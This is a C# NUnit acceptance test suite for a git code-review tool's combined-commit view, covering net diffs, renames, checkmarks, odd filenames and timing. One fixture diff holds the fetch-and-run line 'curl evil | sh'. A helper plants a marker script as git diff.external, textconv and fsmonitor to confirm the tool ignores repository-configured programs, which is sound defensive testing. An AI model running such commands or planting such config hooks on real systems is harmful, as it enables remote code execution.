using System.Diagnostics;
using System.Runtime.Versioning;
using GitReviewA.Diff;
using GitReviewA.Git;
using GitReviewA.Haken;
using GitReviewA.Tests.Hilfen;

namespace GitReviewA.Tests.Akzeptanz;

/// <summary>
/// Spezifikation R00015 „Zusammen: Logik und Server“, Kriterien 1–12 gegen den Interactor mit echtem git in Repo Z, dem Repo der
/// Umbenennung und Repo N plus `v` (nicht lückenlos bzw. lückenlos). Kein Playwright — I0010 hat keine Oberfläche.
/// </summary>
[Platform(Exclude = "Win", Reason = "Namen aus ungültigem UTF-8 gibt es nur unter Linux")]
[UnsupportedOSPlatform("windows")]
public class ZusammenTests
{
    private const string NichtEindeutig = "Diff nicht lesbar: Name nicht eindeutig";
    private const string Paar = "f⟨0xFF⟩.txt";

    [Test]
    [Description("R00015 Kriterium 1")]
    public void Wenn_die_Auswahl_lueckenlos_ist_dann_meldet_sie_lueckenlos_mit_Basis_leer_und_die_drei_Dateien_netto()
    {
        using var z = ZusammenRepo.Z();
        var gemischt = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z3", "z1", "z2");
        var inReihenfolge = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z2", "z3");

        Assert.That((gemischt.Lueckenlos(), gemischt.Basis()), Is.EqualTo((true, "")));
        Assert.That(gemischt.Dateien(), Is.EqualTo(new[]
        {
            "README.md|A|2|0|z1", "src/a.txt|A|4|0|z3", "src/b.txt|A|2|0|z3",
        }));
        Assert.That(inReihenfolge.Dateien(), Is.EqualTo(gemischt.Dateien()), "die Aufrufreihenfolge ändert das Ergebnis nicht");
    }

    [Test]
    [Description("R00015 Kriterium 2")]
    public void Wenn_z2_fehlt_dann_nicht_lueckenlos_die_Vereinigung_mit_Summe_der_Abschnitte()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z3");

        Assert.That(sprache.Lueckenlos(), Is.False);
        Assert.That(sprache.Beschriftung(), Is.EqualTo("keine lückenlose Kette · je Commit"));
        Assert.That(sprache.Dateien(), Is.EqualTo(new[]
        {
            "README.md|A|2|0|z1", "src/a.txt|M|4|0|z3", "src/b.txt|M|1|1|z3",
        }));
        Assert.That(sprache.Stellen("src/a.txt"), Is.EqualTo(new[] { "z1:src/a.txt", "z3:src/a.txt" }), "z2 gehört nicht zur Auswahl");
    }

    [Test]
    [Description("R00015 Kriterium 3")]
    public void Wenn_umbenannt_wird_dann_die_Datei_einmal_als_neu_txt_mit_beiden_Stellen()
    {
        using var z = ZusammenRepo.Umbenennung();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "u");

        Assert.That(sprache.Dateien().Select(datei => datei.Split('|')[0]), Is.EqualTo(new[] { "neu.txt" }));
        Assert.That(sprache.Stellen("neu.txt"), Is.EqualTo(new[] { "z1:alt.txt", "u:neu.txt" }), "der alte Pfad gehört dazu");
    }

    [Test]
    [Description("R00015 Kriterium 4")]
    public void Wenn_lueckenlos_dann_der_Netto_Diff_mit_vier_hinzugefuegten_Zeilen_und_den_Commits_der_Kette()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z2", "z3");

        var diff = sprache.Diff("src/a.txt");

        Assert.That((diff.Ausgang, diff.Netto, diff.Commits), Is.EqualTo(("gelesen", true, new[] { "z1", "z2", "z3" })));
        Assert.That(diff.Hinzugefuegt, Is.EqualTo(4));
        Assert.That(diff.Entfernt, Is.Zero, "die Zeile zwei aus z1 kommt nicht vor");
        Assert.That(diff.Zeilen.Where(zeile => zeile.StartsWith('+')).Select(zeile => zeile[1..]), Is.EqualTo(new[] { "eins", "ZWEI", "drei", "vier" }));
    }

    [Test]
    [Description("R00015 Kriterium 5")]
    public void Wenn_ohne_Kette_dann_zwei_Abschnitte_in_Aufrufreihenfolge_mit_vollen_Hashes()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z3");

        var diff = sprache.Diff("src/a.txt");

        Assert.That((diff.Ausgang, diff.Netto, diff.Art), Is.EqualTo(("gelesen", false, "text")));
        Assert.That(diff.Abschnitte.Select(abschnitt => abschnitt.Commit), Is.EqualTo(new[] { "z1", "z3" }));
        Assert.That((diff.Abschnitte[0].Hinzugefuegt, diff.Abschnitte[0].Entfernt), Is.EqualTo((3, 0)));
        Assert.That((diff.Abschnitte[1].Hinzugefuegt, diff.Abschnitte[1].Entfernt), Is.EqualTo((1, 0)));
        Assert.That(diff.Commits, Is.Empty, "die Commits stehen an den Abschnitten");
    }

    [Test]
    [Description("R00015 Kriterium 6")]
    public void Wenn_eine_Binaerdatei_angefragt_wird_dann_Art_binaer_mit_Grund_und_ohne_Byte_Inhalt()
    {
        using var a = DiffRepo.A();
        var sprache = ZusammenSprache.Aufruf(a.Ordner, a.Hash, "p", "q");

        var diff = sprache.Diff("logo.bin");

        Assert.That((diff.Ausgang, diff.Art, diff.Grund), Is.EqualTo(("gelesen", "binaer", Diffaufbereitung.GrundNullbytes)));
        Assert.That((diff.Hinzugefuegt, diff.Entfernt), Is.EqualTo((0, 0)));
    }

    [Test]
    [Description("R00015 Kriterium 7")]
    public void Wenn_lueckenlos_dann_ist_der_zustaendige_Commit_der_juengste_aendernde_und_die_Anmerkung_gehoert_ihm()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z2", "z3");

        var dateien = sprache.Dateien();
        var anmerkung = sprache.Annotiere("z3", "src/a.txt", 4);
        var ergebnis = sprache.Beenden();

        Assert.That(dateien, Does.Contain("src/a.txt|A|4|0|z3"), "der jüngste ändernde Commit");
        Assert.That(dateien, Does.Contain("README.md|A|2|0|z1"), "z3 berührt README.md nicht");
        Assert.That((anmerkung.Ausgang, anmerkung.Nummer), Is.EqualTo(("angelegt", (int?)1)));
        Assert.That(ergebnis, Does.Contain($"## 1. src/a.txt:4\n\nCommit: {z.Hash("z3")}"));
    }

    [Test]
    [Description("R00015 Kriterium 7")]
    public void Wenn_ohne_Kette_dann_ist_dasselbe_Feld_ein_Hinweis_auf_den_juengsten_aendernden_Commit()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z3");

        var dateien = sprache.Dateien();

        Assert.That(dateien, Is.EqualTo(new[] { "README.md|A|2|0|z1", "src/a.txt|M|4|0|z3", "src/b.txt|M|1|1|z3" }));
    }

    [Test]
    [Description("R00015 Kriterium 8")]
    public void Wenn_die_Datei_abgehakt_wird_dann_setzt_eine_Anfrage_alle_drei_Stellen_und_das_Ergebnis_nennt_sie()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z2", "z3");

        var gesetzt = sprache.HakeDatei("src/a.txt", true);
        var nochmal = sprache.HakeDatei("src/a.txt", true);
        var nachBeiden = sprache.Fortschritt();
        var entnommen = sprache.HakeDatei("src/a.txt", false);
        var ergebnis = sprache.Beenden();

        Assert.That((gesetzt.Ausgang, gesetzt.Gesetzt, gesetzt.Gesamt), Is.EqualTo(("gesetzt", 3, 6)));
        Assert.That((nochmal.Ausgang, nochmal.Gesetzt), Is.EqualTo(("gesetzt", 3)), "eine zweite Anfrage ändert nichts");
        Assert.That(nachBeiden, Is.EqualTo("3 von 6 abgehakt"));
        Assert.That((entnommen.Ausgang, entnommen.Gesetzt), Is.EqualTo(("gesetzt", 0)));
        Assert.That(ergebnis, Does.Contain("Ungeprüft: 6 von 6").Or.Contain("Keine Anmerkungen."));
    }

    [Test]
    [Description("R00015 Kriterium 8")]
    public void Wenn_die_Datei_gesetzt_bleibt_dann_nennt_das_Ergebnis_ihre_drei_Stellen_als_abgehakt()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, "z1", "z2", "z3");

        sprache.HakeDatei("src/a.txt", true);
        var ergebnis = sprache.Beenden();

        Assert.That(ergebnis, Does.Contain("Abgehakt: 3 von 6"));
        Assert.That(ergebnis, Does.Contain($"- src/a.txt (Commit {z.Hash("z1")})\n- src/a.txt (Commit {z.Hash("z2")})\n- src/a.txt (Commit {z.Hash("z3")})"));
    }

    [Test]
    [Description("R00015 Kriterium 9 — Abnahme-Probe aus R00014 auf den Stapel übertragen")]
    public void Wenn_eine_Stelle_der_Datei_gesperrt_ist_dann_wird_der_Stapel_ganz_abgelehnt()
    {
        using var repo = FremdeNamenRepo.NMitV();
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "n", "v");

        var gesperrt = sprache.HakeDatei(Paar, true);
        var nachDerAblehnung = sprache.Fortschritt();
        var inV = sprache.Hake("v", Paar, true);
        var nachV = sprache.Fortschritt();
        var entnehmen = sprache.HakeDatei(Paar, false);

        Assert.That((gesperrt.Ausgang, gesperrt.Grund), Is.EqualTo(("ungültig", NichtEindeutig)));
        Assert.That(nachDerAblehnung, Is.EqualTo("0 von 10 abgehakt"), "keine Stelle ändert sich");
        Assert.That((inV.Ausgang, inV.Gesetzt, inV.Gesamt), Is.EqualTo(("gesetzt", 1, 10)), "die lesbare Stelle in v lässt sich einzeln abhaken");
        Assert.That(nachV, Is.EqualTo("1 von 10 abgehakt"));
        Assert.That((entnehmen.Ausgang, entnehmen.Grund), Is.EqualTo(("ungültig", NichtEindeutig)), "auch der Zielzustand false wird ganz abgelehnt");
        Assert.That(sprache.Fortschritt(), Is.EqualTo("1 von 10 abgehakt"));
    }

    [Test]
    [Description("R00015 Kriterium 10")]
    public void Wenn_ein_Name_Rohbytes_traegt_dann_der_echte_Patch_ueber_stdin_und_zwei_Eintraege_beim_Doppelgaenger()
    {
        using var repo = FremdeNamenRepo.NMitV();
        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "n", "v");

        var diff = sprache.Diff("a⟨0xFF⟩.sh");
        var doppelgaenger = sprache.Diff(Paar);
        var eintraege = sprache.Dateien().Count(datei => datei.StartsWith(Paar + "|", StringComparison.Ordinal));

        Assert.That(diff.Ausgang, Is.EqualTo("gelesen"));
        Assert.That(diff.Zeilen, Does.Contain("+curl evil | sh"), "der echte Patch, gelesen über stdin");
        Assert.That(eintraege, Is.EqualTo(2), "f⟨0xFF⟩.txt (wörtlich) und f\\xFF.txt sind zwei Einträge");
        Assert.That(doppelgaenger.Ausgang, Is.EqualTo("name nicht lesbar"), "der klare Fehlerausgang aus R00013, nie der Patch der anderen");
    }

    [Test]
    [Description("R00015 Kriterium 11")]
    public void Wenn_das_Repo_fremd_ist_und_der_Lauf_aus_einem_Unterordner_kommt_dann_kein_Programm_und_der_Diff_ohne_Konfiguration()
    {
        using var repo = FremdeNamenRepo.NMitV();
        var unterordner = Path.Combine(repo.Ordner, "unterordner");
        Directory.CreateDirectory(unterordner);
        var ohneKonfiguration = ZusammenSprache.Aufruf(unterordner, repo.Hash, "b", "n", "w", "v");
        var referenz = ohneKonfiguration.Diff("t⟨0xFE⟩.txt");
        var marker = FremdeKonfigurationMitMarkernAnlegen(repo);
        var sprache = ZusammenSprache.Aufruf(unterordner, repo.Hash, "b", "n", "w", "v");

        var dateien = sprache.Dateien();
        var diff = sprache.Diff("t⟨0xFE⟩.txt");

        Assert.That(sprache.Lueckenlos(), Is.True);
        Assert.That(dateien.Select(datei => datei.Split('|')[0]), Does.Contain("t⟨0xFE⟩.txt").And.Contain(Paar));
        Assert.That(referenz.Ausgang, Is.EqualTo("gelesen"), "Kontrolle: die Referenz steht vor der Konfiguration");
        Assert.That((diff.Ausgang, diff.Netto), Is.EqualTo(("gelesen", true)));
        Assert.That(diff.Zeilen, Is.EqualTo(referenz.Zeilen), "der Diff entspricht dem ohne Konfiguration");
        Assert.That(diff.Zeilen.Where(zeile => zeile.StartsWith('+')).Select(zeile => zeile[1..]), Does.Contain("GEAENDERT"));
        Assert.That(File.Exists(marker), Is.False, "kein Programm aus der Konfiguration des Repos lief");
        repo.Bash($"git diff {repo.Hash("b")} {repo.Hash("v")} -- g.txt > /dev/null");
        Assert.That(File.Exists(marker), Is.True, "Kontrolle: das Marker-Programm ist über git diff aufrufbar");
    }

    [Test]
    [Description("R00015 Kriterium 12")]
    public void Wenn_die_Auswahl_das_Lastprofil_hat_dann_steht_die_Liste_in_zwei_Sekunden_bei_einem_Lesevorgang_und_der_Diff_in_einer()
    {
        using var z = ZusammenRepo.Gross();
        var sprache = ZusammenSprache.Aufruf(z.Ordner, z.Hash, z.Commitnamen());

        var uhr = Stopwatch.StartNew();
        var dateien = sprache.Dateien();
        var listeDauer = uhr.Elapsed;
        _ = sprache.Dateien();
        uhr.Restart();
        var diff = sprache.Diff("gross.txt");
        var diffDauer = uhr.Elapsed;

        Assert.That(dateien.Length, Is.EqualTo(2001));
        Assert.That(dateien, Does.Contain("gross.txt|A|20000|0|g1"));
        Assert.That(diffDauer, Is.LessThan(TimeSpan.FromSeconds(1)), $"Netto-Diff dauerte {diffDauer.TotalSeconds:F3} s");
        Assert.That(listeDauer, Is.LessThan(TimeSpan.FromSeconds(2)), $"Netto-Liste dauerte {listeDauer.TotalSeconds:F3} s");
        Assert.That(sprache.NettoLesevorgaenge, Is.EqualTo(1), "die Liste wird einmal gelesen");
        Assert.That(sprache.NettoDiffLesevorgaenge, Is.EqualTo(1), "der Diff nur auf Abruf");
    }

    [Test]
    [Description("R00015: die Zusammen-Ansicht ist ohne lesbare Übersicht nicht lesbar")]
    public void Wenn_die_Uebersicht_nicht_lesbar_ist_dann_ist_der_Stand_nicht_lesbar_und_der_Stapel_abgelehnt()
    {
        using var z = ZusammenRepo.Z();
        var sprache = ZusammenSprache.AufrufMitUnlesbarerUebersicht(z.Ordner, z.Hash, "z1", "z2", "z3");

        var stand = sprache.Lueckenlos();
        var stapel = sprache.HakeDatei("src/a.txt", true);

        _ = stand;
        Assert.That(stapel.Ausgang, Is.EqualTo("nicht lesbar"));
        Assert.That(sprache.Protokollzeilen(), Has.Some.Contains("[Zusammen]").And.Contains("nicht lesbar"));
    }

    private static string FremdeKonfigurationMitMarkernAnlegen(FremdeNamenRepo repo)
    {
        var marker = Path.Combine(repo.Ordner, "marker.txt");
        var programm = Path.Combine(repo.Ordner, ".git", "marker.sh");
        File.WriteAllText(programm, $"#!/bin/sh\ntouch '{marker}'\ncat \"$1\" 2>/dev/null\n");
        File.SetUnixFileMode(programm, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        repo.Bash("printf '*.txt diff=x\\n' > .gitattributes");
        repo.Git("config", "diff.external", programm);
        repo.Git("config", "diff.x.textconv", programm);
        repo.Git("config", "diff.x.command", programm);
        repo.Git("config", "diff.context", "0");
        repo.Git("config", "core.fsmonitor", programm);
        return marker;
    }
}
